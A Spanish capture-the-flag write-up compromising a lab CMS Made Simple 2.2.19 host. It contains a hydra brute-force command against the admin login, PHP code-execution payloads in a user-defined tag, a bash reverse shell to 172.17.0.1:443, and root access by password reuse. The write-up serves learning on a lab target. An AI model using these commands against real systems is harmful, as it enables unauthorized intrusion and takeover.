Empezamos la maquina Dificil

![[nmap.png]]
nmap: 22,80

---
entramos a la pagina principal y no hay mucho
![[pagina principal.png]]
 nos vamos al código fuente y dice al final:
![[codigo fuente .png]]
entramos:
> http://172.17.0.2/cmsms/
![[pagina principal 2.png]]
buscando y haciendo Fuerza bruta de directorios, no encontraba mucho, pero me entro la curiosidad por esto:
![[curiosidad 1.png]]
Esta en PHP así que probablemente tiene un "login.php" y al final di con esto
> http://172.17.0.2/cmsms/admin/login.php

![[login.php 1.png]]
que nos lleva al login

si capturo con burpsuite el login que ya tiene por defecto un usuario y contraseña que dicen que es incorrecto, da esto:
> username=admin&password=christelle&loginsubmit=Submit

![[captura burp.png]]
Que realmente no nos dice mucho. 

hacemos un ataque de fuerza bruta:

    - hydra -l admin -P /usr/share/wordlists/rockyou.txt  "http-post-form://172.17.0.2/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"  

![[fuerza bruta.png]]

y nos da la contraseña "chocolate" para admin
probamos en el panel de login
![[panel admin.png]]
ya estamos dentro el panel, vemos una versión antigua entonces buscamos las vulnerabilidades conocidas para la versión 2.2.19 de CMS Made Simple. las cuales encontré con esta explicación 

> |[CVE-2024-27625](https://translate.google.com/website?sl=en&tl=es&hl=es&client=srp&u=https://www.cve.org/CVERecord?id%3DCVE-2024-27625)|La versión 2.2.19 de CMS Made Simple es vulnerable a ataques de secuencias de comandos entre sitios (XSS). Esta vulnerabilidad reside en el módulo Administrador de archivos del panel de administración. En concreto, el problema surge debido a una limpieza inadecuada de la entrada del usuario en el campo "Nuevo directorio".|
  [CVE-2024-27623](https://translate.google.com/website?sl=en&tl=es&hl=es&client=srp&u=https://www.cve.org/CVERecord?id%3DCVE-2024-27623)|La versión 2.2.19 de CMS Made Simple es vulnerable a la inyección de plantillas del lado del servidor (SSTI). La vulnerabilidad existe en el Administrador de diseño, en particular al editar las rutas de navegación.|

aquí la pagina de la explicación sobre la vulnerabilidad: https://cve-mitre-org.translate.goog/cgi-bin/cvekey.cgi?keyword=cms+made+simple&_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc


nos vamos a: 
> extensiones > user defined tags > add defined tags > le colocamos un nombre y pruebo su vulnerabilidad 

![[prueba.png]]

en code colocamos:

    - <?php echo system('id'); ?>

veremos que queda guardado y entramos al "prueba" que creamos:

guardamos y colocamos "run" nos mostrara este mensaje:
![[prueba 2.png]]

probamos si la vulnerabilidad que encontramos esta funcionando:
![[prueba 3.png]]
nos dará: 

>uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)

o sea que la vulnerabilidad esta funcionando

entonces modificamos ese código dentro del paréntesis y colocamos así la reverse shell con nuestro terminal en escucha:

     - <?php echo system('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"'); ?>

![[reverse .png]]

entonces la lanzamos con el terminal en escucha y entramos.
![[conexion .png]]
dentro no encontré nada y probé con la misma contraseña de admin del panel por curiosidad con el usuario  admin
ingresamos la contraseña "chocolate" al su root
![[final.png]]
y somos root! 


